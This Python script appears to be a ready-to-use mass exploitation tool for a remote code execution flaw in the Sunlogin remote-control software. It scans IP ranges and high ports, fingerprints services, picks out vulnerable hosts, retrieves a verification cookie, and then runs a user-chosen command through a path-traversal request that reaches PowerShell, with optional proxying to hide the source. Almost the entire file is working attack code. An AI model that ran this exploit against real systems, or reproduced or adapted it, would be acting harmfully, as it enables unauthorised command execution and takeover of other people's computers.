# -*- coding: UTF-8 -*- 
import requests

requests.packages.urllib3.disable_warnings()
import json
import argparse
import random
import sys
from concurrent.futures import ThreadPoolExecutor
import socket
import re
import asyncio
import time
import platform
from IPy import IP


def parse_ip_strict(target):
    """
    略显严格的目标IP格式解析
    # 1.1.1.1-1.1.1.10
    # 10.17.1.1/24
    # 10.17.2.30-55
    # 10.111.22.12
    """
    ip_list = list()
    # 校验target格式是否正确
    m = re.match(
        r'\d{1,3}(\.\d{1,3}){3}-\d{1,3}(\.\d{1,3}){3}$', target)
    m1 = re.match(
        r'\d{1,3}(\.\d{1,3}){3}/(1[6789]|2[012346789]|3[012])$', target)
    m2 = re.match(r'\d{1,3}(\.\d{1,3}){3}-\d{1,3}$', target)
    m3 = re.match(r'\d{1,3}(\.\d{1,3}){3}$', target)
    if ',' in target:
        ip_list = target.split(',')
    elif m:
        prev = target.rsplit('.', 4)[0]
        start = target.rsplit('-', 1)[0].rsplit('.', 1)[1]
        end = target.rsplit('-', 1)[1].rsplit('.', 1)[1]
        if int(end) < int(start):
            print('IP范围前端大于后端,请重新输入!!!')
            exit()
        for x in range(int(start), int(end) + 1):
            ip_list.append(prev + "." + str(x))
    elif m1:
        tmp_ip_list = list()
        for x in IP(target, make_net=True):
            tmp_ip_list.append(str(x))
        ip_list = tmp_ip_list[1:]
    elif m2:
        prev = target.rsplit('.', 1)[0]
        st, sp = target.split('.')[-1].split('-')
        if int(sp) < int(st):
            print('IP范围前端大于后端,请重新输入!!!')
            exit()
        for x in range(int(st), int(sp) + 1):
            ip_list.append(prev + "." + str(x))
    elif m3:
        ip_list.append(target)
    else:
        error_msg = "IP {} invalid format".format(target)
        raise Exception(error_msg)

    # 校验 ip 是否正确
    func = lambda x: all([int(y) < 256 for y in x.split('.')])
    for ip in ip_list:
        if not func(ip):
            error_msg = "IP {} invalid format".format(target)
            raise Exception(error_msg)

    return ip_list


class ParseTarget(object):
    """ParseTarget"""

    def __init__(self):
        super(ParseTarget, self).__init__()
        self.ip_list = list()

    def parse_ip_relaxed(self, targets):
        """
        略显宽松的目标IP格式解析
        # 10.17.1.1/24
        # 10.17.2.30-55
        # 10.111.22.12
        """
        if isinstance(targets, list):
            for target in targets:
                ips = parse_ip_strict(target)
                self.ip_list.extend(ips)
        elif isinstance(targets, str):
            if ',' in targets:
                targets = targets.split(',')
                for target in targets:
                    ips = parse_ip_strict(target)
                    self.ip_list.extend(ips)
            else:
                ips = parse_ip_strict(targets)
                self.ip_list.extend(ips)

        # ip 排序去重
        ips = [ip for ip in sorted(set(self.ip_list), key=socket.inet_aton)]
        return ips


def complex_ports_str_to_port_segment(ports_str):
    if isinstance(ports_str, list):
        ports_str = ','.join(ports_str)
    if isinstance(ports_str, str):
        ports_str = ports_str.replace(' ', '')

    # # 如果端口格式是 80,1-1000,10001
    if ',' in ports_str and '-' in ports_str:
        port_list = ports_str_to_port_list(ports_str)
        port_list.sort()
        if len(port_list) > 2000:
            # 如果端口超过500个,返回最小端口和最大端口范围 1-10001
            ports_str = '{port_start}-{port_end}'.format(port_start=port_list[0], port_end=port_list[-1])
            return ports_str
        else:
            # 如果端口不超过500个,返回,号拼接的端口列表
            ports_str = ','.join(str(port) for port in port_list)
        return ports_str
    # 如果端口格式是其他格式,就直接返回
    else:
        return ports_str


def ports_str_to_port_list(ports_str):
    port_list = []
    if isinstance(ports_str, list):
        ports_str = ','.join(ports_str)
    if isinstance(ports_str, str):
        ports_str = ports_str.replace(' ', '')

    for port_str in ports_str.split(","):
        if '-' in port_str:
            port_start = int(port_str.split("-")[0].strip())
            port_end = int(port_str.split("-")[1].strip())
            port_list.extend([port for port in range(port_start, port_end + 1)])
        else:
            port_list.append(int(port_str))
    return port_list


class AsyncTcpScan(object):
    def __init__(self, all_alive_ip_host, ports):
        # 基本设置
        super(AsyncTcpScan, self).__init__()
        self.open_ip_port_list = dict()  # 存放IP及其对应的开放端口列表
        self.alive_ip_host = all_alive_ip_host
        self.ports = ports
        self.run_stop_flag = True

        # 程序设置
        self.os_type = platform.system()
        self.program_name = "asyctcp"
        self.timeout = 0.3
        self.rate = 1000

        # 其他设置
        self.init_rate()
        self.port_list = ports_str_to_port_list(self.ports)
        # print(self.port_list )

    def init_rate(self):
        # 设置扫描速率
        if self.os_type == 'Windows' and self.rate > 500:
            self.rate = 500

    async def async_port_check(self, semaphore, ip, port):
        async with semaphore:
            try:
                conn = asyncio.open_connection(ip, port)
                _, _ = await asyncio.wait_for(conn, timeout=self.timeout)
                return ip, port, 'open'
            except KeyboardInterrupt:
                time.sleep(self.timeout)
                print("[-] User aborted.")
                sys.exit(0)
            except Exception as e:
                return ip, port, 'close'
            finally:
                conn.close()

    def callback(self, future):
        # 回调处理结果
        ip, port, status = future.result()
        if status == "open":
            try:
                if ip not in self.open_ip_port_list: self.open_ip_port_list[ip] = []
                self.open_ip_port_list[ip].append(port)
            except Exception as e:
                print("[-] Exception {}".format(str(e)))

    def run(self):
        # 处理IP,端口列表
        ip_port_list = [(ip, port) for ip in self.alive_ip_host for port in self.port_list]
        # 开始异步扫描任务
        tasks = list()
        # 限制异步扫描并发量
        sem = asyncio.Semaphore(self.rate * len(self.alive_ip_host))
        for ip, port in ip_port_list:
            task = asyncio.ensure_future(self.async_port_check(sem, ip, port))
            task.add_done_callback(self.callback)
            tasks.append(task)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(asyncio.wait(tasks))

        # 输出IP对于端口扫描结果
        ports = complex_ports_str_to_port_segment(self.ports)
        for ip in self.alive_ip_host:
            if ip in self.open_ip_port_list and len(self.open_ip_port_list[ip]) > 0:
                print("[*] {}:{}:{}".format(ip, ports if len(ports) < 20 else str(ports[:20]) + "...",
                                            self.open_ip_port_list[ip]))
            else:
                print("[-] {}:{}:没有扫描到端口".format(ip, ports if len(ports) < 20 else str(ports[:20]) + "..."))

        return self.open_ip_port_list


class TcpGetPortService(object):
    """获取端口运行的服务"""

    def __init__(self, all_open_ip_port):
        super(TcpGetPortService, self).__init__()
        self.ip_port_service_dict = dict()
        self.open_ip_port = all_open_ip_port
        self.run_stop_flag = True

        # 程序设置
        self.program_name = "tcpscan"
        self.thread_pool_number = 10
        self.timeout = 0.5

        # 其他设置
        self.SIGNS = (
            # 协议 | 版本 | 关键字
            b'smb|smb|^\0\0\0.\xffSMBr\0\0\0\0.*',
            b"xmpp|xmpp|^\<\?xml version='1.0'\?\>",
            b'netbios|netbios|^\x79\x08.*BROWSE',
            b'netbios|netbios|^\x79\x08.\x00\x00\x00\x00',
            b'netbios|netbios|^\x05\x00\x0d\x03',
            b'netbios|netbios|^\x82\x00\x00\x00',
            b'netbios|netbios|\x83\x00\x00\x01\x8f',
            b'backdoor|backdoor|^500 Not Loged in',
            b'backdoor|backdoor|GET: check_live_options',
            b'backdoor|backdoor|sh: GET:',
            b'bachdoor|bachdoor|[a-z]*sh: .* check_live_options not found',
            b'backdoor|backdoor|^bash[$#]',
            b'backdoor|backdoor|^sh[$#]',
            b'backdoor|backdoor|^Microsoft Windows',
            b'db2|db2|.*SQLDB2RA',
            b'dell-openmanage|dell-openmanage|^\x4e\x00\x0d',
            b'finger|finger|^\r\n    Line      User',
            b'finger|finger|Line     User',
            b'finger|finger|Login name: ',
            b'finger|finger|Login.*Name.*TTY.*Idle',
            b'finger|finger|^No one logged on',
            b'finger|finger|^\r\nWelcome',
            b'finger|finger|^finger:',
            b'finger|finger|^must provide username',
            b'finger|finger|finger: GET: ',
            b'ftp|ftp|^220.*\n331',
            b'ftp|ftp|^220.*\n530',
            b'ftp|ftp|^220.*FTP',
            b'ftp|ftp|^220 .* Microsoft .* FTP',
            b'ftp|ftp|^220 Inactivity timer',
            b'ftp|ftp|^220 .* UserGate',
            b'ftp|ftp|^220.*FileZilla Server',
            b'ldap|ldap|^\x30\x0c\x02\x01\x01\x61',
            b'ldap|ldap|^\x30\x32\x02\x01',
            b'ldap|ldap|^\x30\x33\x02\x01',
            b'ldap|ldap|^\x30\x38\x02\x01',
            b'ldap|ldap|^\x30\x84',
            b'ldap|ldap|^\x30\x45',
            b'ldp|ldp|^\x00\x01\x00.*?\r\n\r\n$',
            b'rdp|rdp|^\x03\x00\x00\x0b',
            b'rdp|rdp|^\x03\x00\x00\x11',
            b'rdp|rdp|^\x03\0\0\x0b\x06\xd0\0\0\x12.\0$',
            b'rdp|rdp|^\x03\0\0\x17\x08\x02\0\0Z~\0\x0b\x05\x05@\x06\0\x08\x91J\0\x02X$',
            b'rdp|rdp|^\x03\0\0\x11\x08\x02..}\x08\x03\0\0\xdf\x14\x01\x01$',
            b'rdp|rdp|^\x03\0\0\x0b\x06\xd0\0\0\x03.\0$',
            b'rdp|rdp|^\x03\0\0\x0b\x06\xd0\0\0\0\0\0',
            b'rdp|rdp|^\x03\0\0\x0e\t\xd0\0\0\0[\x02\xa1]\0\xc0\x01\n$',
            b'rdp|rdp|^\x03\0\0\x0b\x06\xd0\0\x004\x12\0',
            b'rdp-proxy|rdp-proxy|^nmproxy: Procotol byte is not 8\n$',
            b'msrpc|msrpc|^\x05\x00\x0d\x03\x10\x00\x00\x00\x18\x00\x00\x00\x00\x00',
            b'msrpc|msrpc|\x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0\0\0\0$',
            b'mssql|mssql|^\x05\x6e\x00',
            b'mssql|mssql|^\x04\x01',
            b'mssql|mysql|;MSSQLSERVER;',
            b'mysql|mysql|mysql_native_password',
            b'mysql|mysql|^\x19\x00\x00\x00\x0a',
            b'mysql|mysql|^\x2c\x00\x00\x00\x0a',
            b'mysql|mysql|hhost \'',
            b'mysql|mysql|khost \'',
            b'mysql|mysql|mysqladmin',
            b'mysql|mysql|whost \'',
            b'mysql|mysql|^[.*]\x00\x00\x00\n.*?\x00',
            b'mysql-secured|mysql|this MySQL server',
            b'mysql-secured|MariaDB|MariaDB server',
            b'mysql-secured|mysql-secured|\x00\x00\x00\xffj\x04Host',
            b'db2jds|db2jds|^N\x00',
            b'nagiosd|nagiosd|Sorry, you \(.*are not among the allowed hosts...',
            b'nessus|nessus|< NTP 1.2 >\x0aUser:',
            b'oracle-tns-listener|\(ERROR_STACK=\(ERROR=\(CODE=',
            b'oracle-tns-listener|\(ADDRESS=\(PROTOCOL=',
            b'oracle-dbsnmp|^\x00\x0c\x00\x00\x04\x00\x00\x00\x00',
            b'oracle-https|^220- ora',
            b'rmi|rmi|\x00\x00\x00\x76\x49\x6e\x76\x61',
            b'rmi|rmi|^\x4e\x00\x09',
            b'postgresql|postgres|Invalid packet length',
            b'postgresql|postgres|^EFATAL',
            b'rpc-nfs|rpc-nfs|^\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00',
            b'rpc|rpc|\x01\x86\xa0',
            b'rpc|rpc|\x03\x9b\x65\x42\x00\x00\x00\x01',
            b'rpc|rpc|^\x80\x00\x00',
            b'rsync|rsync|^@RSYNCD:',
            b'smux|smux|^\x41\x01\x02\x00',
            b'snmp-public|snmp-public|\x70\x75\x62\x6c\x69\x63\xa2',
            b'snmp|snmp|\x41\x01\x02',
            b'socks|socks|^\x05[\x00-\x08]\x00',
            b'ssl|ssl|^..\x04\0.\0\x02',
            b'ssl|ssl|^\x16\x03\x01..\x02...\x03\x01',
            b'ssl|ssl|^\x16\x03\0..\x02...\x03\0',
            b'ssl|ssl|SSL.*GET_CLIENT_HELLO',
            b'ssl|ssl|^-ERR .*tls_start_servertls',
            b'ssl|ssl|^\x16\x03\0\0J\x02\0\0F\x03\0',
            b'ssl|ssl|^\x16\x03\0..\x02\0\0F\x03\0',
            b'ssl|ssl|^\x15\x03\0\0\x02\x02\.*',
            b'ssl|ssl|^\x16\x03\x01..\x02...\x03\x01',
            b'ssl|ssl|^\x16\x03\0..\x02...\x03\0',
            b'sybase|sybase|^\x04\x01\x00',
            b'telnet|telnet|Telnet',
            b'telnet|telnet|^\xff[\xfa-\xff]',
            b'telnet|telnet|^\r\n%connection closed by remote destination_ips!\x00$',
            b'rlogin|rlogin|login: ',
            b'rlogin|rlogin|rlogind: ',
            b'rlogin|rlogin|^\x01\x50\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x20\x64\x65\x6e\x69\x65\x64\x2e\x0a',
            b'tftp|tftp|^\x00[\x03\x05]\x00',
            b'uucp|uucp|^login: password: ',
            b'vnc|vnc|^RFB',
            b'imap|imap|^\* OK.*?IMAP',
            b'pop|pop|^\+OK.*?',
            b'smtp|smtp|^220.*?SMTP',
            b'smtp|smtp|^554 SMTP',
            b'ftp|ftp|^220-',
            b'ftp|ftp|^220.*?FTP',
            b'ftp|ftp|^220.*?FileZilla',
            b'ssh|ssh|^SSH-',
            b'ssh|ssh|connection refused by remote destination_ips.',
            b'rtsp|rtsp|^RTSP/',
            b'sip|sip|^SIP/',
            b'nntp|nntp|^200 NNTP',
            b'sccp|sccp|^\x01\x00\x00\x00$',
            b'webmin|webmin|.*MiniServ',
            b'webmin|webmin|^0\.0\.0\.0:.*:[0-9]',
            b'websphere-javaw|websphere-javaw|^\x15\x00\x00\x00\x02\x02\x0a',
            b'smb|smb|^\x83\x00\x00\x01\x8f',
            b'docker-daemon|docker-daemon|^\x15\x03\x01\x00\x02\x02',
            b'mongodb|mongodb|MongoDB',
            b'Rsync|Rsync|@RSYNCD:',
            b'Squid|Squid|X-Squid-Error',
            b'mssql|Mssql|MSSQLSERVER',
            b'Vmware|Vmware|VMware',
            b'iscsi|iscsi|\x00\x02\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            b'redis|redis|^-ERR unknown check_live_options',
            b'redis|redis|^-ERR wrong number of arguments',
            b'redis|redis|^-DENIED Redis is running',
            b'memcached|memcached|^ERROR\r\n',
            b'websocket|websocket|Server: WebSocket',
            b'https|https|Instead use the HTTPS scheme to access'
            b'https|https|HTTPS ports',
            b'https|https|Location: https',
            b'http|http|^HTTP',
            b'http|topsec|^\x15\x03\x03\x00\x02\x02',
            b'SVN|SVN|^\( success \( 2 2 \( \) \( edit-pipeline svndiff1',
            b'dubbo|dubbo|^Unsupported check_live_options',
            b'http|elasticsearch|cluster_name.*elasticsearch',
            b'RabbitMQ|RabbitMQ|^AMQP\x00\x00\t\x01',
        )
        self.init_thread()

    def init_thread(self):
        # 设定线程数量
        if 0 < len(self.open_ip_port) < self.thread_pool_number:
            self.thread_pool_number = len(self.open_ip_port)

    def tcp_service_module(self, ip, port):
        # tcp 获取端口的 service
        socket.setdefaulttimeout(self.timeout)
        if self.run_stop_flag:
            service_result = dict()
            try:
                response1 = b''
                proto = 'Unknow'
                payload = 'X' * int(random.random() * 100)
                payload1 = (
                        'GET / HTTP/1.1\r\nHOST: %s\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4\r\nAccept: text/html\r\nCookie: adminUser=123\r\n\r\n' % ip)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((ip, port))

                if result == 0:
                    sock.sendall(payload1.encode())
                    response1 = sock.recv(512)
                    for pattern in self.SIGNS:
                        pattern = pattern.split(b'|')
                        if re.search(pattern[-1], response1, re.IGNORECASE):
                            proto = pattern[1].decode()
                            break

                    service_result['type'] = 'tcpscan'
                    service_result['ports'] = port
                    service_result['proto'] = proto
                    service_result['state'] = 'open'
                    service_result['product'] = 'NULL'
                    service_result['version'] = 'NULL'
                    service_result['response'] = bytes.decode(response1)
                else:
                    service_result['type'] = 'tcpscan'
                    service_result['ports'] = port
                    service_result['proto'] = 'unkonw'
                    service_result['state'] = 'filtered'
                    service_result['product'] = 'NULL'
                    service_result['version'] = 'NULL'
                    service_result['response'] = 'NULL'
            except Exception as e:
                service_result['type'] = 'tcpscan'
                service_result['ports'] = port
                service_result['proto'] = 'unkonw'
                service_result['state'] = 'filtered'
                service_result['product'] = 'NULL'
                service_result['version'] = 'NULL'
                service_result['response'] = str(e)
            finally:
                if ip not in self.ip_port_service_dict: self.ip_port_service_dict[ip] = []
                self.ip_port_service_dict[ip].append(service_result)
                sock.close()

    def run(self):
        try:
            with ThreadPoolExecutor(max_workers=self.thread_pool_number) as executor:
                for ip in self.open_ip_port.keys():
                    for port in self.open_ip_port[ip]:
                        executor.submit(self.tcp_service_module, ip, port)
        except KeyboardInterrupt:
            print("[-] User aborted.")
            self.run_stop_flag = False
            sys.exit(0)
        except Exception as e:
            print('[-] Exception', e)
        return self.ip_port_service_dict


def get_cookie(ip_port, proxies):
    url = "http://{ip_port}/cgi-bin/rpc?action=verify-haras".format(ip_port=ip_port)
    # 192.168.2.58:54381
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36",
        "Host": "{ip_port}".format(ip_port=ip_port),
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Proxy-Connection": "keep-alive"
    }
    response = requests.request("GET", url, data=payload, headers=headers, verify=False, proxies=proxies)
    # print(response)
    # print(response.status_code)
    print("{} response: {}".format(ip_port, response.text))
    cookie = None
    try:
        json_str = json.loads(response.text)
        # print("json_str", json_str)
        cookie = json_str["verify_string"]
        # print("cookie", cookie)
    except Exception as e:
        print(ip_port, str(e))
    return cookie


def run_cmd(ip_port, cookie, cmd, proxies):
    url = f"http://{ip_port}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{cmd}".format(
        ip_port=ip_port, cmd=cmd)
    payload = ""
    headers = {
        "Cookie": "CID={cookie};".format(cookie=cookie),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36",
        "Host": "{ip_port}".format(ip_port=ip_port),
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Proxy-Connection": "keep-alive"
    }
    response = requests.request("GET", url, data=payload, headers=headers, verify=False, proxies=proxies)
    # print(response.status_code)
    # print(response)
    # print(response.content)
    response.encoding = 'gb2312'
    print(ip_port, response.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.description = "Sun Login RCE CMD ..."
    parser.add_argument("-i", "--ip", help="输入目标IP、目标IP段、目标IP范围", default='127.0.0.1')
    parser.add_argument("-p", "--ports", help="输入目标端口、目标端口范围", default="40000-60000")

    parser.add_argument("-v", "--verify", help="是否验证Cookie获取和命令执行", default=False, action="store_true")
    parser.add_argument("-c", "--cmd", help="批量命令执行时使用的命令", default="whoami")
    parser.add_argument("-x", "--proxies",
                        help="通过代理进行请求，支持Socks5和HTTP, 例如: http://127.0.0.1:8080 or socks5://127.0.0.1:1080",
                        default=None)
    args = parser.parse_args()

    if args.proxies is not None: args.proxies = {'http': args.proxies.replace('https://', 'http://'),
                                                 'https': args.proxies.replace('http://', 'https://')}

    ip_host = parse_ip_strict(args.ip)
    print("ip_list: {}".format(ip_host))
    ports = args.ports
    print("ports: {}".format(ports))

    print("[+] 开始通过AsyncTcpScan模块进行IP端口检测!!!")
    ResultAsyncTcpScan = AsyncTcpScan(ip_host, ports).run()
    # print(ResultAsyncTcpScan)

    if len(ResultAsyncTcpScan) > 0:
        print("[+] 开始通过ResultTcpGetPortService模块进行开放端口指纹检测!!!")
        ResultTcpGetPortService = TcpGetPortService(ResultAsyncTcpScan).run()
        # print(ResultTcpGetPortService)

        print("[+] 开始分析是否存在向日葵RCE漏洞指纹!!!")
        vul_ip_port = []
        for ip, probes in ResultTcpGetPortService.items():
            for probe in probes:
                if "Verification failure" in probe['response']:
                    vul_ip_port.append("{ip}:{port}".format(ip=ip, port=probe['ports']))
        print("[+] 所有存在向日葵RCE漏洞的IP端口号：{}".format(vul_ip_port))

        if len(vul_ip_port) > 0 and args.verify != False:
            print("[+] 获取所有Cookie数据并执行命令：{}".format(vul_ip_port))
            for host in vul_ip_port:
                cookie = get_cookie(host, args.proxies)
                run_cmd(host, cookie, args.cmd, args.proxies)
